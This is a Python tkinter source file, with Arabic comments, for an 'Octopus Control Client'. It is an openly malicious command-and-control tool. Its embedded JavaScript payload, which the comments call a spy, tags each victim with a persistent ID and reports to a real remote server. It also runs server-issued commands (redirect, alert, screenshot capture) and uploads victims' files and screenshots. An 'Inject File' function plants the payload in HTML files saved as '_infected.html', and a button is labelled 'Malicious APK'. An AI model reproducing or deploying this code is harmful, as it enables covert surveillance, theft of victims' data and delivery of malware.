import tkinter as tk
from tkinter import filedialog, messagebox, ttk, scrolledtext, simpledialog
import requests
import threading
import time
import json
import base64
import os
import webbrowser
from datetime import datetime
from PIL import Image, ImageTk
import io

# ================= إعدادات الاتصال =================
SERVER_URL = "https://web-production-5330.up.railway.app"  # ضع رابط سيرفرك هنا

# ================= كود الحقن (الجاسوس) =================
JS_PAYLOAD = f'''
(function() {{
    const SERVER = "{SERVER_URL}";
    
    // 1. تثبيت الهوية
    let DEV_ID = localStorage.getItem("_oct_uid");
    if (!DEV_ID) {{
        DEV_ID = "MOB-" + Math.random().toString(36).substr(2, 6).toUpperCase();
        localStorage.setItem("_oct_uid", DEV_ID);
    }}

    // 2. دالة الاتصال الرئيسية
    async function octopusPing(evt, extra={{}}) {{
        const data = {{
            device_id: DEV_ID,
            event: evt,
            model: navigator.userAgent,
            timestamp: Date.now(),
            ...extra
        }};

        try {{
            await fetch(SERVER + "/api/heartbeat", {{
                method: "POST",
                headers: {{"Content-Type": "application/json"}},
                body: JSON.stringify(data),
                keepalive: true
            }});
        }} catch(e) {{}}
    }}

    // 3. التسجيل الأولي
    async function register() {{
        await fetch(SERVER + "/api/connect", {{
            method: "POST",
            headers: {{"Content-Type": "application/json"}},
            body: JSON.stringify({{
                device_id: DEV_ID,
                model: navigator.platform,
                screen: screen.width + "x" + screen.height
            }})
        }});
    }}

    // 4. معالج الأوامر
    async function checkCmds() {{
        try {{
            const r = await fetch(SERVER + "/api/heartbeat", {{
                method: "POST",
                headers: {{"Content-Type": "application/json"}},
                body: JSON.stringify({{device_id: DEV_ID}})
            }});
            const data = await r.json();
            
            if(data.commands) {{
                data.commands.forEach(c => {{
                    console.log("Executing:", c.type);
                    if(c.type === "alert") alert(c.data.message);
                    if(c.type === "reload") location.reload();
                    if(c.type === "redirect") window.location.href = c.data.url;
                    if(c.type === "screenshot") takeShot();
                    
                    // --- ميزة طلب الملف ---
                    if(c.type === "request_file") {{
                        let input = document.createElement("input");
                        input.type = "file";
                        input.onchange = e => {{
                            let file = e.target.files[0];
                            let formData = new FormData();
                            formData.append("file", file);
                            formData.append("device_id", DEV_ID);
                            fetch(SERVER + "/api/upload", {{method: "POST", body: formData}});
                        }};
                        input.click();
                    }}
                }});
            }}
        }} catch(e) {{}}
    }}

    // 5. لقطة الشاشة
    function takeShot() {{
        if(typeof html2canvas === 'undefined') {{
            let s = document.createElement("script");
            s.src = "https://html2canvas.hertzen.com/dist/html2canvas.min.js";
            s.onload = () => doShot();
            document.head.appendChild(s);
        }} else {{ doShot(); }}
    }}

    function doShot() {{
        html2canvas(document.body).then(canvas => {{
            const img = canvas.toDataURL("image/jpeg", 0.5);
            fetch(SERVER + "/api/upload", {{
                method: "POST",
                headers: {{"Content-Type": "application/json"}},
                body: JSON.stringify({{data: img, device_id: DEV_ID}})
            }});
        }});
    }}

    register();
    setInterval(checkCmds, 3000);

}})();
'''

class OctopusClient:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🐙 Octopus Control Client")
        self.root.geometry("1200x800")
        self.root.configure(bg="#1a1a1a")
        
        self.selected_device = None
        self.setup_ui()
        self.start_monitoring()
        self.root.mainloop()

    def setup_ui(self):
        # Header
        tk.Label(self.root, text="OCTOPUS CONTROL CLIENT", font=("Impact", 24), bg="#1a1a1a", fg="#00ff00").pack(pady=10)
        
        # Main Split
        paned = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg="#1a1a1a")
        paned.pack(fill="both", expand=True, padx=10, pady=10)

        # Device List
        frame_list = tk.LabelFrame(paned, text="Devices", bg="#1a1a1a", fg="white")
        paned.add(frame_list, width=400)
        
        cols = ("ID", "Model", "Status")
        self.tree = ttk.Treeview(frame_list, columns=cols, show="headings")
        for c in cols: self.tree.heading(c, text=c)
        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<<TreeviewSelect>>", self.on_select)

        # Controls
        frame_ctrl = tk.Frame(paned, bg="#1a1a1a")
        paned.add(frame_ctrl)
        
        tk.Label(frame_ctrl, text="Commands", bg="#1a1a1a", fg="white", font=("Arial", 12)).pack(pady=5)
        
        btns = [
            ("📸 Screenshot", "screenshot", "blue"),
            ("📂 Request File", "request_file", "purple"),
            ("📢 Alert", "alert", "orange"),
            ("🌐 Redirect", "redirect", "green"),
            ("☠️ Malicious APK", "install_apk", "red")
        ]
        
        for txt, cmd, clr in btns:
            tk.Button(frame_ctrl, text=txt, bg=clr, fg="white", font=("Arial", 10, "bold"), width=20,
                      command=lambda c=cmd: self.send_cmd(c)).pack(pady=5)

        tk.Button(frame_ctrl, text="💉 Inject File", bg="#333", fg="white", command=self.inject).pack(pady=20)

        # Log
        self.log_box = scrolledtext.ScrolledText(frame_ctrl, height=10, bg="black", fg="#00ff00")
        self.log_box.pack(fill="x", pady=10)

    def log(self, msg):
        self.log_box.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.log_box.see(tk.END)

    def start_monitoring(self):
        def loop():
            while True:
                try:
                    # هذه الدالة تتطلب نقطة نهاية API خاصة في السيرفر لجلب الأجهزة بصيغة JSON
                    # في الكود أعلاه، الصفحة /control تعرض HTML، لكن يمكنك إضافة endpoint JSON
                    pass 
                except: pass
                time.sleep(5)
        threading.Thread(target=loop, daemon=True).start()

    def on_select(self, event):
        sel = self.tree.selection()
        if sel:
            self.selected_device = self.tree.item(sel[0], "values")[0]
            self.log(f"Selected: {self.selected_device}")

    def send_cmd(self, cmd_type):
        if not self.selected_device:
            messagebox.showwarning("Error", "Select a device!")
            return
        
        payload = {}
        if cmd_type == "alert":
            msg = simpledialog.askstring("Input", "Message:")
            if not msg: return
            payload = {"message": msg}
        elif cmd_type == "redirect":
            url = simpledialog.askstring("Input", "URL:")
            if not url: return
            payload = {"url": url}
            
        data = {
            "device_id": self.selected_device,
            "type": cmd_type,
            "payload": payload
        }
        
        threading.Thread(target=lambda: requests.post(f"{SERVER_URL}/api/command", json=data)).start()
        self.log(f"Sent {cmd_type}")

    def inject(self):
        path = filedialog.askopenfilename(filetypes=[("HTML", "*.html")])
        if path:
            with open(path, 'r', encoding='utf-8') as f: content = f.read()
            inj = f"<script>{JS_PAYLOAD}</script>"
            new_c = content.replace("</body>", f"{inj}</body>") if "</body>" in content else content + inj
            
            save_path = path.replace(".html", "_infected.html")
            with open(save_path, 'w', encoding='utf-8') as f: f.write(new_c)
            messagebox.showinfo("Success", f"File saved: {save_path}")

if __name__ == "__main__":
    OctopusClient()
